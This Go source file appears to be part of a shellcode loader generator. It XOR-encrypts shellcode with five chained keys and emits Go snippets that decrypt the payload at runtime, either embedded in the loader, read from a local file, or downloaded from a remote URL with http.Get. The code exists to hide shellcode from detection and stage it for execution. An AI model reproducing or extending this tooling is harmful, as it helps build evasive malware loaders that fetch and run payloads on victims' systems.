package encode

var (
	XorDecrypt = []string{
		`
		func xorEncrypt(shellcode []byte, Key byte) []byte {
			ciphertext := make([]byte, len(shellcode))
			for i := 0; i < len(shellcode); i++ {
				ciphertext[i] = shellcode[i] ^ Key // 使用异或操作进行加密
			}
			return ciphertext
		}
		func f(shellcode []byte) ([]byte){
			key1:=13
			key2:=241
			key3:=143
			key4:=221
			key5:=98
			shellcode=xorEncrypt(shellcode, byte(key1))
			shellcode=xorEncrypt(shellcode, byte(key2))
			shellcode=xorEncrypt(shellcode, byte(key3))
			shellcode=xorEncrypt(shellcode, byte(key4))
			shellcode=xorEncrypt(shellcode, byte(key5))
			return shellcode
		}
		`,
		`
		"crypto/aes"
 		"crypto/cipher"
  		"encoding/hex"
		`,
		`
		"io/ioutil"
		`, `
		"net/http"
		"io/ioutil"
		`,
	}
)

func Xor(shellcode []byte, Key byte) []byte {
	ciphertext := make([]byte, len(shellcode))
	for i := 0; i < len(shellcode); i++ {
		ciphertext[i] = shellcode[i] ^ Key // 使用异或操作进行加密
	}
	return ciphertext
}

func XorGenerate(byteData []byte, sepMode, sepSrc string) string {
	encryptShellcode := XorEn(byteData) //进行加密处理

	hexString := byteSliceToHexString(encryptShellcode)
	switch sepMode {
	case "default":
		byteString := "byteSlice :=" + hexString + "\n\t" + "byteSlice = f(byteSlice)\n\t"
		return byteString
	case "Local Separate":
		// 创建一个文件来写入加密的数据
		CreateSeprarteLocalFile(encryptShellcode, sepSrc)
		byteString := "byteSlice, _ := ioutil.ReadFile(\"" + sepSrc + "\")" + "\n\t" + "byteSlice = f(byteSlice)\n\t"
		return byteString
	case "Remote Separate":
		// 创建一个文件来写入加密的数据 存储到本地,使用时需要重命名
		CreateSeprarteLocalFile(encryptShellcode, "sc.ini")
		byteString := `res, _ := http.Get("` + sepSrc + `") 
					byteSlice, _ := ioutil.ReadAll(res.Body) 
					byteSlice = f(byteSlice)`
		return byteString
	}
	return "Error"
}
